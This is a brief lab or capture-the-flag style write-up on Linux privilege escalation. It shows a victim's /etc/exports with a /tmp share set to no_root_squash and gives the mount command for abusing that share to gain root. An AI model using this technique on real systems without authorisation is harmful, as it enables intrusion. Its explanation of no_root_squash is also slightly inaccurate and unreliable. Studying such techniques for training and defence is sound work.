After gaining the initial foothold...

```
TCM@debian:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)

TCM@debian:~$
```

In here, the `no_root_squash` means that we can mount this drive on the device.  We do that on our device by the following...

`sudo mount -t nfs -o rw,vers=2 10.10.255.6:/tmp /tmp/mountme`    - the IP will be whatever the victim ip is

Then you can create your exploit and put it into the shared folder and run it in order to get your root privileges.
